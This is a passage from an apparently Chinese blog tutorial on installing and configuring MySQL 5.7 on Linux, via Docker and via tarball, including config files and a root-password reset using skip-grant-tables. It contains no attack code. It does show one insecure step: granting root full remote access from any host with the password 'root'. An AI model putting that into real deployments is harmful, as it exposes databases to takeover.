</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[client]
</span></span><span style="display:flex;"><span>default-character-set = utf8mb4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[mysql]
</span></span><span style="display:flex;"><span>default-character-set = utf8mb4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[mysqld]
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#服务Id唯一</span>
</span></span><span style="display:flex;"><span>server-id = <span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span>port = <span style="color:#ff0;font-weight:bold">3306</span>
</span></span><span style="display:flex;"><span>log-error = /var/log/mysql/error.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#只能用IP地址</span>
</span></span><span style="display:flex;"><span>skip_name_resolve
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>character-set-client-handshake = FALSE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#数据库默认字符集</span>
</span></span><span style="display:flex;"><span>character-set-server = utf8mb4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#数据库字符集对应一些排序等规则</span>
</span></span><span style="display:flex;"><span>collation-server = utf8mb4_general_ci
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#设置client连接mysql时的字符集,防止乱码</span>
</span></span><span style="display:flex;"><span>init_connect=<span style="color:#0ff;font-weight:bold">&#39;SET NAMES utf8mb4&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#最大连接数</span>
</span></span><span style="display:flex;"><span>max_connections = <span style="color:#ff0;font-weight:bold">1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#解决only_full_group_by问题</span>
</span></span><span style="display:flex;"><span>sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#时区</span>
</span></span><span style="display:flex;"><span>default-time_zone = <span style="color:#0ff;font-weight:bold">&#39;+8:00&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#内存监控</span>
</span></span><span style="display:flex;"><span>performance_schema_instrument =<span style="color:#0ff;font-weight:bold">&#39;memory%=counted&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># 跳过域名解析，可以解决MySQL连接慢的问题</span>
</span></span><span style="display:flex;"><span>skip-name-resolve
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#慢查询日志</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#slow_query_log= on</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#long_quert_time= 2</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#slow-query-log-file = /home/mysql-slow-log.log</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过容器的 mysql 命令行工具连接
<code>docker exec -it mysql mysql -uroot -proot</code></p>
<p>设置 root 远程访问
<code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option; flush privileges;</code></p>
<p>如果服务器开放了3306端口，那么现在可以通过 navicat 远程连接mysql了。</p>
<h3 id="普通方式安装">普通方式安装<a hidden class="anchor" aria-hidden="true" href="#普通方式安装">#</a></h3>
<p><a href="https://dev.mysql.com/downloads/mysql/">官网下载mysql安装包</a>
拉到页面下方，下拉选<code>Select Operating System</code>，选择<code>Linux-Generic</code>，<code>Select OS Version</code>选择64位。如果不想下载8.0，可以选择右侧的<code>Looking for the latest GA version?</code>，会出现mysql5.7版本。
下载最下边的<code>Linux - Generic (glibc 2.12) (x86, 64-bit), TAR</code>，下载完，上传到linux服务器<code>/usr/local/src</code>位置。
或使用wget获取安装包：
<code>wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz</code></p>
<p>解压缩：<code>tar -zxvf mysql-5.7...</code>
重命名：<code>mv mysql-5.7... mysql</code>
在mysql根目录创建data文件夹：<code>mkdir data</code>
创建mysql的用户组和用户，并对mysql目录设置用户组和用户：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> groupadd mysql
</span></span><span style="display:flex;"><span> useradd mysql -g mysql
</span></span><span style="display:flex;"><span> cd mysql
</span></span><span style="display:flex;"><span> pwd:/usr/local/mysql
</span></span><span style="display:flex;"><span> chown -R mysql .
</span></span><span style="display:flex;"><span> chgrp -R mysql .
</span></span></code></pre></td></tr></table>
</div>
</div><p>初始化mysql并启动mysql服务：
<code>cd /usr/local/mysql</code></p>
<p>初始化：
<code>./bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data </code></p>
<p>报错：
<code>error while loading shared libraries: libnuma.so.1: cannot open shared object file: No such file or directory</code></p>
<p>如果已经安装了libnuma.so.1，先执行
<code>yum remove libnuma.so.1</code></p>
<p>然后安装64位版本：
<code>yum -y install numactl.x86_64</code></p>
<p>还是上边的报错，执行：
<code>yum install -y libaio</code>
或执行：
<code>yum install -y libaio.so.1</code></p>
<p>然后执行上边的初始化指令，最后提示如下初始化成功：
<code> A temporary password is generated for root@localhost: C(tSgbIuh4yy</code>
最后提示的是默认的密码。</p>
<p>然后修改下权限，把除了data外的所有mysql文件的权限都设置为root：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chown -R root .
</span></span><span style="display:flex;"><span>chown -R mysql data
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后修改mysql配置文件（如果没有自己创建）：
<code>vi /etc/my.cnf</code>
或是这么找：<code>find / -type f -name 'my.cnf'</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[mysqld]
</span></span><span style="display:flex;"><span>basedir=/usr/local/mysql
</span></span><span style="display:flex;"><span>datadir=/usr/local/mysql/data
</span></span><span style="display:flex;"><span>socket=/usr/local/mysql/tmp/mysql.sock
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># 取消密码验证，一会改完密码这段还要注释掉</span>
</span></span><span style="display:flex;"><span>skip-grant-tables
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#服务Id唯一</span>
</span></span><span style="display:flex;"><span>server-id = <span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span>port = <span style="color:#ff0;font-weight:bold">3306</span>
</span></span><span style="display:flex;"><span>log-error = /var/log/mysql/error.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#只能用IP地址</span>
</span></span><span style="display:flex;"><span>skip_name_resolve
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>character-set-client-handshake = FALSE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#数据库默认字符集</span>
</span></span><span style="display:flex;"><span>character-set-server = utf8mb4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#数据库字符集对应一些排序等规则</span>
</span></span><span style="display:flex;"><span>collation-server = utf8mb4_general_ci
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#设置client连接mysql时的字符集,防止乱码</span>
</span></span><span style="display:flex;"><span>init_connect=<span style="color:#0ff;font-weight:bold">&#39;SET NAMES utf8mb4&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#最大连接数</span>
</span></span><span style="display:flex;"><span>max_connections = <span style="color:#ff0;font-weight:bold">1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#解决only_full_group_by问题</span>
</span></span><span style="display:flex;"><span>sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#时区</span>
</span></span><span style="display:flex;"><span>default-time_zone = <span style="color:#0ff;font-weight:bold">&#39;+8:00&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#内存监控</span>
</span></span><span style="display:flex;"><span>performance_schema_instrument =<span style="color:#0ff;font-weight:bold">&#39;memory%=counted&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#慢查询日志</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#slow_query_log= on</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#long_quert_time= 2</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#slow-query-log-file = /home/mysql-slow-log.log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[client]
</span></span><span style="display:flex;"><span>socket=/usr/local/mysql/tmp/mysql.sock
</span></span><span style="display:flex;"><span>default-character-set = utf8mb4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[mysqld_safe]
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#log-error=/var/log/mariadb/mariadb.log</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#pid-file=/var/run/mariadb/mariadb.pid</span>
</span></span><span style="display:flex;"><span>basedir=/usr/local/mysql
</span></span><span style="display:flex;"><span>datadir=/usr/local/mysql/data
</span></span><span style="display:flex;"><span>socket=/usr/local/mysql/tmp/mysql.sock
</span></span><span style="display:flex;"><span>port=<span style="color:#ff0;font-weight:bold">3306</span>
</span></span><span style="display:flex;"><span>sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># include all files from the config directory</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#</span>
</span></span><span style="display:flex;"><span>!includedir /etc/my.cnf.d
</span></span></code></pre></td></tr></table>
</div>
</div><p>basedir就是mysql根目录，datadir就是上面在mysql根目录中新建的data文件夹。
socket我在mysql根目录中新建了一个tmp文件夹，然后这里就指向了它，mysql.sock这个文件在启动mysql时会自动创建，所以只要新建tmp文件夹就行了。</p>
<p>修改tmp文件夹权限：
<code>chown -R mysql:mysql tmp</code></p>
<p>将mysql加入服务
<code>cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql</code>
开机启动
<code>chkconfig mysql on</code>
启动mysql
<code>service mysql start</code></p>
<p>还有一些启动方式作为参考：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#/etc/init.d/mysql start  或者  ./bin/mysqld_safe&amp;
</span></span><span style="display:flex;"><span>#/etc/init.d/mysql stop   或者  ./bin/mysqladmin -u root -p shutdown
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以使用<code>./bin/mysqld_safe&amp;</code>命令启动mysql服务，启动后检查下<code>ps -ef|grep mysql</code>检查下是否启动
启动：
<code>./bin/mysqld_safe&amp;</code>
见到如下内容说明启动成功：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[1] 30706
</span></span><span style="display:flex;"><span>[root@VM_0_12_centos mysql-5.7]# Logging to &#39;/usr/local/mysql-5.7/data/VM_0_12_centos.err&#39;.
</span></span><span style="display:flex;"><span>2019-06-09T01:55:28.047197Z mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql-5.7/data
</span></span></code></pre></td></tr></table>
</div>
</div><p>输入bg后台运行，然后再运行<code>ps -ef|grep mysql</code>检查可以看到mysql已经启动了。</p>
<p>连接mysql：
<code>/usr/local/mysql/bin/mysql -u root -p</code></p>
<p>报错：
<code>mysql: [ERROR] unknown variable 'symbolic-links=0'</code></p>
<p>查看my.cnf文件，文件中
<code># Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0</code>
应该是分两行展示了，修改该行为一行显示。</p>
<p>再次链接Mysql(由于/etc/my.cnf中设置了取消密码验证，所以此处密码直接回车即可)：
<code>/usr/local/mysql/bin/mysql -u root -p</code></p>
<p>输入默认密码报错：
<code>Can't connect to local MySQL server through socket '/usr/local/mysql-5.7/tmp/mysql.sock' (2)</code>
此时需要检查配置文件<code>vi /etc/my.cnf</code>，socket文件路径是否正确，tmp文件夹是否已经创建。</p>
<p>成功登录mysql，执行sql报错：
<code>You must reset your password using ALTER USER statement before executing this statement.</code></p>
<p>设置密码：
操作mysql数据库
<code>use mysql;</code></p>
<p>修改root用户的密码：
<code>update user set authentication_string=password('你的密码') where user='root';</code>
<code>flush privileges;</code>
<code>exit;</code></p>
<p>将/etc/my.cnf中的skip-grant-tables删除，然后登录再次设置密码（不知道为啥如果不再次设置密码就操作不了数据库了）
<code>/usr/local/mysql/bin/mysql -u root -p</code></p>
<p>执行如下sql：
<code>alter user 'root'@'localhost' identified by '修改后的密码';</code>
注意mysql_5.7之前的版本需要把<code>authentication_string</code>替换为：<code>password</code></p>
<p>允许远程连接</p>
